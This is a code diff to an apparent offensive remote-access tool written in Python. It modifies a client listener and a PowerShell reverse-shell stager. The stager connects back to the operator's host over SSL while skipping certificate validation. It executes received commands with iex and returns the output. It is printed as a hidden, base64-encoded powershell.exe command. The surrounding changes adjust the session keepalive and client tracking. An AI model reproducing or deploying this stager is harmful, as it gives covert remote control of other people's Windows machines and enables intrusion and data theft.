@@ -81,8 +81,6 @@ def startClientListener():
             clientnumber += 1
             sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n>')
             sys.stdout.flush()
-            clientconn.sendall("cd ../../../../../../")
-            clientconn.recv(20)
 
             worker = Thread(target=pingClients, args=(clientconn,clientnumber))
             worker.setDaemon(True)
@@ -92,7 +90,6 @@ def startClientListener():
         clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
 
     ws.close()
-
 
 
 def interactShell(clientconn,clientnumber):
@@ -144,16 +141,18 @@ def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
 
 def printListener():
     windows_powershell_stager = (
+        "cd ($env:SystemDrive + '\\');"
         "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
         "$b = New-Object Byte[] $c.ReceiveBufferSize;"
         "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
         "$sl.AuthenticateAsClient($env:computername);"
         "while($c.Connected){"
         "$i = $sl.Read($b, 0, $b.Length);"
-        "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i);"
+        "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i).replace(\"\x00\",\"\");"
+        "if($d.length -gt 0){"
         "$cb = (iex -c $d 2>&1 | Out-String);"
         "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()};$c.Close()")
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}};$c.Close()")
 
     print 'powershell.exe -WindowStyle Hidden -NonInteractive -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
     return True
@@ -164,8 +163,9 @@ def pingClients(clientconn,clientnumber):
     try:
         while True:
             time.sleep(15)
-            clientconn.recv(1)
-    except:
+            clientconn.sendall('\x00')
+    except Exception as E:
+        print E
         if str(clientnumber) in clientMenuOptions.keys():
             print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
             del clientMenuOptions[str(clientnumber)]
